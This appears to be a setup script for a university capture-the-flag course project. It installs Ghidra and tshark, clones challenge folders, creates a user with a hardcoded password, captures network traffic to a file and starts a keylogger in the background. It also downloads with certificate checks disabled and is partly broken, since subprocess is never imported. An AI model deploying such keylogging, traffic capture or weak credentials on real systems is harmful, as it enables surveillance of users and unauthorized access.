'''
Startup script to install dependencies needed for 
CS 5352 Team 4 Project

Installations include:
    Ghidra
    Netcat
    Wireshark
    Others
If applications are already installed,
this script will update to ensure consinstency

Also, we assume this is running on Ubuntu 20.04 distro

Finally, to execute type on terminal

sudo python3 startup.py
'''
import os

def apt_upgrade():
    os.system('sudo apt update')

def install_jdk():
    os.system('sudo apt install openjdk-21-jdk')

def install_ghidra():
    print('Now installing Ghidra')
    install_jdk() # This ghidra needs jdk 21 :(
    os.system('sudo wget --no-check-certificate https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.2_build/ghidra_11.2_PUBLIC_20240926.zip')
    os.system('unzip ghidra_11.2_PUBLIC_20240926.zip')
    os.system('sudo rm ghidra_11.2_PUBLIC_20240926.zip')
    os.system('mv ghidra_11.2_PUBLIC ghidra')
    print('#'*50)
    print('Ghidra installed')
    print('To open, use the command ./ghidraRun through the ghidra/ directory')

def install_tshark():
    os.system('sudo apt install tshark')
    print('tshark will be used to track you!')
    os.system('sudo tshark > your-network-info')

def clone_project():
    os.system('git clone https://github.com/RicardoAcostaArambula/computer_security/')
    os.system('sudo cp -r computer_security CTF')
    os.system('sudo rm -r computer_security/')
    os.system('cd CTF/ && sudo git remote remove origin')
    os.system('sudo mv CTF/Ricardo/ CTF/Challenge1/')
    os.system('sudo mv CTF/Kevin/ CTF/Challenge2/')
    os.system('sudo mv CTF/Jazmin/ CTF/Challenge3/')
    os.system('sudo mv CTF/Adrian/ CTF/Challenge4/')
    os.system('sudo mv CTF/Jorge/ CTF/Challenge5/')

def create_user():
    os.system('sudo useradd -m joe')
    os.system('echo "joe:Doe" | sudo chpasswd')

def open_html():
    os.system('firefox CTF/WebUI/index.html')
    
def install_pynput():
    print("Now installing pynput library.")
    os.system('sudo apt install -y python3-pip')
    os.system('pip3 install pynput')
    
def start_logger():
    print("Now starting keylogger in the background")
    subprocess.Popen(["python3", "logger.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
def main():
    apt_upgrade()
    install_ghidra()
    install_tshark()
    clone_project()
    create_user()
    open_html()
    start_logger()



if __name__ == '__main__':
    main()
